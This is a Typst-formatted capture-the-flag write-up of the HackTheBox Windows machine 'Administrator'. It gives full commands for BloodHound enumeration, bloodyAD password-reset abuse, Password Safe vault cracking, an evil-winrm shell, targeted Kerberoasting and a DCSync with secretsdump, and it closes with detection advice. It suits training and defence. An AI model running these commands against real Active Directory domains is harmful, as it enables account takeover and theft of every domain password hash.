#import "../../template/lib.typ": *

#show: htb-writeup.with(
  machine: "Administrator",
  os: "Windows",
  difficulty: "Medium",
  ip: "10.129.52.90",
  released: "2024-11-09",
  retired: "2025-04-19",
  tags: ("ad", "kerberos"),
  procedures: ("bloodyAD", "kerberoast", "dcsync"),
  summary: [A credentialed Active Directory box: starting from a low-privilege
    domain account, I walk an ACL chain with BloodHound and bloodyAD, loot a
    Password Safe vault off FTP, land a shell as `emily`, then abuse a
    GenericWrite via targeted Kerberoasting and finish with a DCSync of the
    domain Administrator.],
  chain: (
    ("Recon", [Full TCP `nmap`], "administrator.htb DC"),
    ("Enumeration", [BloodHound as `Olivia`], "ACL path to Share Moderators"),
    ("Cred Access", [bloodyAD ForceChangePassword chain], "Own Michael → Benjamin"),
    ("Loot", [FTP `Backup.psafe3` + john], "Password Safe creds"),
    ("Foothold", [evil-winrm as `emily`], [#flag("user")]),
    ("PrivEsc", [Targeted Kerberoast of `ethan`], "ethan / limpbizkit"),
    ("DA", [DCSync as `ethan`], [#flag("root")]),
  ),
)

= Recon

The box is handed to us with a foothold credential, but the scan still sets the
stage. A full TCP sweep at a high rate came back looking like a textbook domain
controller.

Initial full TCP scan
#cmd("nmap", "nmap -p- -sCV $IP --min-rate 10000")

#cmd(none, "PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows AD LDAP (Domain: administrator.htb)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows AD LDAP (Domain: administrator.htb)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0
Service Info: Host: DC; OS: Windows")

The interesting trio: 88 (Kerberos), 389/3268 (LDAP) confirm `administrator.htb`
and that the host is the DC. FTP on 21 is unusual for a DC and worth flagging for
later. 5985 (WinRM) is our likely path to a shell once we have the right
credentials. SMB signing is enabled and required, and `nmap` noted a 7-hour clock
skew — that skew matters the moment Kerberos enters the picture.

#gotcha[The ~7h clock skew (`clock-skew: 7h00m00s`) will break Kerberos ticket
  requests with `KRB_AP_ERR_SKEW`. Later steps wrap `impacket-GetUserSPNs` in
  `faketime` against the DC's clock to stay inside the allowed window.]

= Foothold

We start with a provided low-privilege domain credential:

#cmd(none, "Olivia : ichliebedich")

== Mapping the domain with BloodHound

With any valid credential, the first move on an AD box is to collect the graph.
`bloodhound-python` pulls sessions, ACLs, and group membership over LDAP.

#cmd("bloodhound", "bloodhound-python -d administrator.htb -u 'Olivia' -p 'ichliebedich' -ns 10.129.52.90 -c all --zip")

Marking `Olivia` as owned and looking at outbound object control surfaced a clean
ACL abuse path leading toward the *Share Moderators* group.

#ev(image("evidence/BloodHound Path.png"), caption: [BloodHound: Olivia's outbound
  control path toward Share Moderators.])

== Walking the ACL chain with bloodyAD

The path is a series of password-reset rights (ForceChangePassword). Rather than
touch each hop manually, `bloodyAD` makes the resets one command each: Olivia can
reset Michael, and Michael in turn can reset Benjamin.

#cmd("bloodyAD", "bloodyAD -d administrator.htb --host 10.129.52.90 -u Olivia -p 'ichliebedich' set password Michael 'Password123!'

bloodyAD -d administrator.htb --host 10.129.52.90 -u Michael -p 'Password123!' set password Benjamin 'Password123!'")

Benjamin is the payoff: that account has FTP access, and the FTP root holds a
`Backup.psafe3` file — a Password Safe v3 vault.

#cmd("ftp", "ftp administrator.htb")

#ev(image("evidence/Benjamin ftp.png"), caption: [Benjamin's FTP session with the
  `Backup.psafe3` vault available for download.])

== Cracking the Password Safe vault

Password Safe vaults are opened with a single master password. `pwsafe2john`
converts the file to a hash John can attack, and rockyou has the master password.

#cmd("john", "pwsafe2john Backup.psafe3 > psafe.hash

john psafe.hash --wordlist=/usr/share/wordlists/rockyou.txt")

That returns the master password `tekieromucho`. Opening the vault with it reveals
three sets of domain credentials.

#ev(image("evidence/Pwsafe.png"), caption: [The decrypted Password Safe vault and
  its three stored credentials.])

#cmd(none, "alexander : UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily     : UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma      : WwANQWnmJnGV07WQN8bMS7FMAbjNur")

Testing each, `emily`'s credential is the one that grants WinRM access, so we drop
into a shell as her.

#cmd("evil-winrm", "evil-winrm -i administrator.htb -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'")

That shell yields the user flag.

#flag("user")

= Privilege Escalation

Back to the graph. Emily is not a dead end: she holds *GenericWrite* over the user
`ethan`.

#ev(image("evidence/Emily privs.png"), caption: [Emily's GenericWrite over ethan.])

== Targeted Kerberoast

GenericWrite over a user lets us write a Service Principal Name onto that account.
Any account with an SPN is Kerberoastable, so we plant a fake SPN on `ethan`,
request a service ticket for it, and crack the ticket offline — a *targeted*
Kerberoast.

#cmd("bloodyAD + kerberoast", "bloodyAD -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --host 10.129.52.90 set object ethan servicePrincipalName -v 'HTTP/fake.ad.administrator.htb'

faketime \"$DC_TIME\" impacket-GetUserSPNs administrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -dc-ip 10.129.52.90 -request-user ethan -outputfile ethan.kerberoast")

The `faketime` wrapper is what keeps the 7h clock skew from rejecting the request.
The resulting TGS hash falls to rockyou in hashcat.

#cmd("hashcat", "hashcat -m 13100 ethan.kerberoast rockyou.txt")

That cracks to `limpbizkit`.

== DCSync to Domain Admin

Checking `ethan`'s rights explains why he was the target all along: he holds
replication rights (DS-Replication-Get-Changes), which means he can DCSync.

#ev(image("evidence/Ethan Privs.png"), caption: [Ethan's DCSync rights over the
  domain.])

With that, `secretsdump` replicates the domain's secrets and pulls the
Administrator NT hash straight from the DC.

#cmd("secretsdump", "impacket-secretsdump 'administrator.htb/ethan:limpbizkit@10.129.52.90' -just-dc")

#ev(image("evidence/DCSync.png"), caption: [DCSync dumping domain hashes, including
  the Administrator account.])

The Administrator NT hash (`3dc5…`) is enough to authenticate over WinRM as the
domain Administrator via pass-the-hash, which gives the root flag.

#flag("root")

#detect[The full chain is loud on a monitored DC: `bloodyAD` password resets and
  SPN writes generate directory-modification events (4738/5136), the targeted
  Kerberoast requests an RC4 service ticket (4769) for a freshly-created SPN, and
  the DCSync shows up as replication traffic (4662 with the DS-Replication GUID)
  from a non-DC principal — each a strong standalone signal.]
